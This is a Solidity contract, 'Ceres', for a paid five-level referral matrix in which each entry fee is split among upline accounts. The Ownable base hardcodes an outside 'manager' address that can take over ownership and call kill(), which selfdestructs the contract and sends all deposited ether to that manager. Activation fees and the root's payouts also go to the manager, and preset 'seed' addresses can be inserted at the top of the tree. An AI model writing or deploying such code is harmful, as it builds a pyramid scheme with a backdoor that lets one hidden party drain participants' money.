pragma solidity >=0.4.21 <0.7.0;


library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a * b;
        assert(a == 0 || c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract Ownable {
    address public owner;
    address public manager;
    bool public active;
    constructor() public {
        owner = msg.sender;
        manager = 0x8E968988807b41b317BbA732435723f25221E955;
        active = (owner == manager);
    }

    modifier onlyManager() {
        require(msg.sender == manager, "2002");
        _;
    }

    modifier onlyOwnerOrManager() {
        require(
            (msg.sender == owner) || (msg.sender == manager),
            "2003"
        );
        _;
    }

    function transferOwner(address newOwner) public onlyManager {
        owner = newOwner;
    }

    function transferManager(address _manager) public onlyManager {
        manager = _manager;
    }

    function transferActive(bool _active) public onlyManager {
      active = _active;
    }

    function kill() public onlyOwnerOrManager { 
        selfdestruct(address(uint160(manager)));
    }
}

contract Ceres is Ownable {
    event registerEvent(
        address indexed _user,
        address indexed _referrer,
        uint256 _userid,
        uint256 _referrerid,
        uint256 _time,
        uint256 _expired
    );
    event buyEvent(
        address indexed _user,
        uint256 _userid,
        uint256 _time,
        uint256 _expired
    );

    event withdrawEvent(
        address indexed _user,
        uint256 _amound
    );

    uint256 REFERRER_1_LEVEL_LIMIT = 5;
    uint256 PERIOD_LENGTH = 365 days;
    uint256 LEVEL_PRICE = 1 ether;
    uint256 ACTIVE_PRICE = 5 ether;
    uint256[5] DISTRIBUTION=[10,15,20,25,30];
    

    struct UserStruct {
      bool isExist;
      uint256 id;
      uint256 referrerID; 
      address[] referral; 
      uint256 expired; 
      uint256 recommend;
      uint256 amount;
      uint256 paid;
    }


    mapping(address => UserStruct) public users;
    mapping(uint256 => address) public userList;
    uint256 public currUserID = 0;
    uint256 public tradingTotal = 0;
    uint256 public etherTotal = 0;
    uint256 public createTime = 0;
    uint256 public seedIndex = 0;

    constructor(uint256 _days, uint256 _level_price,uint256 _active_price,uint256[5] memory _distribution) public {
      require(_days > 0 && _days <= 3650, "2004");
      ACTIVE_PRICE = _active_price;
      PERIOD_LENGTH = _days * 1 days;
      LEVEL_PRICE = _level_price;
      
      uint256 _total = 0;
      for(uint i = 0; i < 5; i++) {
          if(_distribution[i]>0){
              _total+=_distribution[i];
          }else{
              _total = 0;
              break;
          }
      }
      if(_total!=100){
          revert("2020");
      }
      DISTRIBUTION = _distribution;
      
      
      UserStruct memory userStruct;
      currUserID++;

      userStruct = UserStruct({
          isExist: true,
          id: currUserID,
          referrerID: 0,
          referral: new address[](0),
          expired:32503680000,
          recommend:0,
          amount:0,
          paid:0
      });
      users[msg.sender] = userStruct;
      userList[currUserID] = msg.sender;

      createTime=now;
      active = (msg.sender==manager);
    }

    function() external payable {
        address sender = msg.sender;
        if(active==false && ACTIVE_PRICE==msg.value){
          address(uint160(manager)).transfer(msg.value);
          active = true;
          return;
        }
        require(msg.value == LEVEL_PRICE, "2006");
        if (users[sender].isExist) {
            buyLevel(sender);
        } else {
            uint256 refId = 0;
            address referrer = bytesToAddress(msg.data);
            if (users[referrer].isExist) {
                refId = users[referrer].id;
            } else {
                revert("2009");
            }
            registerLevel(refId, sender);
        }
        tradingTotal++;
    }

    function registerLevel(uint256 _referrer, address _user)
        public
        payable
    {
        require(!users[_user].isExist, "2010");
        require(
            _referrer > 0 && _referrer <= currUserID,
            "2011"
        );
        require(msg.value == LEVEL_PRICE, "2008");

        uint256 originalReferrer = _referrer;
        if (
            users[userList[_referrer]].referral.length >= REFERRER_1_LEVEL_LIMIT
        ) {
            _referrer = users[findFreeReferrer(userList[_referrer])].id;
        }

        UserStruct memory userStruct;
        currUserID++;

        uint256 expired = now + PERIOD_LENGTH;

        userStruct = UserStruct({
            isExist: true,
            id: currUserID,
            referrerID: _referrer,
            referral: new address[](0),
            expired:expired,
            recommend:0,
            amount:0,
            paid:0
        });
        
        users[_user] = userStruct;
        userList[currUserID] = _user;
        
        users[userList[_referrer]].referral.push(_user);
        users[userList[originalReferrer]].recommend +=1;
        payForLevel(_user);
        emit registerEvent(
            _user,
            userList[_referrer],
            userStruct.id,
            userStruct.referrerID,
            now,
            expired
        );
    }

    function buyLevel(address _user) public payable {
        require(users[_user].isExist, "2012");
        require(msg.value == LEVEL_PRICE, "2008");
        uint256 expired = users[_user].expired;
        if (expired < now) {
            expired = now;
        }
        expired += PERIOD_LENGTH;
        users[_user].expired = expired;
        
        payForLevel(_user);
        emit buyEvent(_user, users[_user].id, now, expired);
    }

    function buyHelp(address _target)
        external
        payable
    {
        require(msg.value == LEVEL_PRICE, "2008");
        if (users[_target].isExist) {
            buyLevel(_target);
        }else{
            uint256 refId = 0;
            if (users[msg.sender].isExist) {
                refId = users[msg.sender].id;
            } else {
                revert("2009");
            }
            registerLevel(refId, _target);
        }
        tradingTotal++;
    }

    function payForLevel(address _user) internal {
      address[] memory referrers=new address[](5);
      referrers[0]=findReferrer(_user);
      referrers[1]=findReferrer(referrers[0]);
      referrers[2]=findReferrer(referrers[1]);
      referrers[3]=findReferrer(referrers[2]);
      referrers[4]=findReferrer(referrers[3]);
      
      uint256 toManager=0;
      for(uint256 i=0;i<referrers.length;i++){
        address _addr=referrers[i];
        uint256 value = SafeMath.div(SafeMath.mul(LEVEL_PRICE,DISTRIBUTION[i]),100);
        if(active==false && _addr==userList[1]){
            toManager+=value;
        }else{
            users[_addr].amount=SafeMath.add(users[_addr].amount,value);
        }
      }
      if(toManager>0){
          address(uint160(manager)).transfer(toManager);
      }
      etherTotal += msg.value;
    }

    function withdraw()
        external
        payable
    {
        uint256 amount = users[msg.sender].amount;
        require(users[msg.sender].isExist,"2012");
        require(amount>0,"2018");
        require(address(this).balance>=amount,"2019");
        users[msg.sender].paid=SafeMath.add(users[msg.sender].paid,amount);
        users[msg.sender].amount=0;
        address(uint160(msg.sender)).transfer(amount);
        emit withdrawEvent(msg.sender,amount);
    }

    function findFreeReferrer(address _user)
        public
        view
        returns (address)
    {
        if (users[_user].referral.length < REFERRER_1_LEVEL_LIMIT) {
            return _user;
        }
        address[] memory referrals=new address[](11718);
        for(uint256 i = 0; i < REFERRER_1_LEVEL_LIMIT; i++) {
          referrals[i] = users[_user].referral[i];
        }

        address freeReferrer;
        bool noFreeReferrer = true;

        for(uint256 i=0;i<referrals.length;i++){
          if (users[referrals[i]].referral.length == REFERRER_1_LEVEL_LIMIT) {
              if(i<3905){
                for(uint256 j = 0; j < REFERRER_1_LEVEL_LIMIT; j++) {
                    referrals[(i+1)*REFERRER_1_LEVEL_LIMIT+j] = users[referrals[i]].referral[j];
                }
              }
          } else {
              noFreeReferrer = false;
              freeReferrer = referrals[i];
              break;
            }
        }

        require(!noFreeReferrer, "2016");
        return freeReferrer;
    }

    function appendSeed(address _referrer,uint256 sum) external payable onlyManager {
        require(users[_referrer].isExist,"2009");
        require(tradingTotal==0,"Not allowed to add");
        SeedContract sc = SeedContract(0xBEBE40605260F8716A18B3C5007b9113Ec65CE61);
        address[] memory _seeds = sc.getList();
        uint256 limit=sum+seedIndex;
        require(_seeds.length>=limit,"Alternate address exceeded");

        uint256 refId = 0;
        
        for(uint256 i=seedIndex;i<limit;i++){
            uint256 n=i/5;
            if(n==0){
                refId = users[_referrer].id;
            }else{
                refId=users[_seeds[n-1]].id;
            }
            address _user=_seeds[i];
            UserStruct memory userStruct;
            currUserID++;

            userStruct = UserStruct({
                isExist: true,
                id: currUserID,
                referrerID: refId,
                referral: new address[](0),
                expired:0,
                recommend:0,
                amount:0,
                paid:0
            });
            users[_user] = userStruct;
            userList[currUserID] = _user;
            users[userList[refId]].referral.push(_user);
        }
        seedIndex=limit;
    }

    function viewUserById(uint256 userid) 
        public
        view
        returns (uint256 id,address useraddr, uint256 referrerid, address referrer,address[] memory referrals, uint256 expired, uint256 recommend, uint256 amount,uint256 paid)
    {
        return viewUser(userList[userid]);
    }

    function viewUser(address _user)
        public
        view
        returns (uint256 id,address useraddr, uint256 referrerid, address referrer,address[] memory referrals, uint256 expired, uint256 recommend, uint256 amount,uint256 paid)
    {
        id = users[_user].id;
        referrerid = users[_user].referrerID;
        recommend = users[_user].recommend;
        amount = users[_user].amount;
        paid = users[_user].paid;
        if (referrerid > 0) {
            referrer = userList[referrerid];
        } else {
            referrer = address(0);
        }
        expired = users[_user].expired;
        referrals = users[_user].referral;
        
        return (id,_user, referrerid, referrer,referrals, expired, recommend, amount,paid);
    }

    function viewExists(address _user)
        public
        view
        returns (bool)
    {
        return users[_user].isExist;
    }

    function viewExistsById(uint256 _user)
        public
        view
        returns (bool)
    {
        return users[userList[_user]].isExist;
    }

    function viewReferralsById(uint256 userid)
        public
        view
        returns (address[] memory)
    {
        return viewReferrals(userList[userid]);
    }

    function viewReferrals(address _user)
        public
        view
        returns (address[] memory)
    {
        return users[_user].referral;
    }

    function viewSummary()
        public
        view
        returns (address _owner,address _manager,uint256 user_sum,uint256 trading_sum,uint256 ether_sum,
        bool active_status,uint256 cycle,uint256 create_time,uint256 price,uint256 active_price,uint256 balance)
    {
        _owner=owner;
        _manager=manager;
        user_sum=currUserID;
        trading_sum=tradingTotal;
        ether_sum=etherTotal;
        active_status=active;
        cycle=PERIOD_LENGTH / 1 days;
        create_time=createTime;
        price=LEVEL_PRICE;
        active_price=ACTIVE_PRICE;
        balance=address(this).balance;
    }

    function viewTest() public view returns (uint256 bb){
        bb=etherTotal;
    }

    function findReferrer(address _user)
        internal
        returns (address ref)
    {
        uint256 _id = users[_user].referrerID;
        if(_id==0){
            ref = userList[1];
        }else if(users[userList[_id]].expired>=now){
            ref= userList[_id];
        }else{
            ref=findReferrer(userList[_id]);
        }
    }

    function bytesToAddress(bytes memory bys)
        private
        pure
        returns (address addr)
    {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
    function test2() public view returns(uint256,uint256){
        return (seedIndex,currUserID);
    }
}

contract SeedContract  {
    function getList() public view returns(address[] memory);
}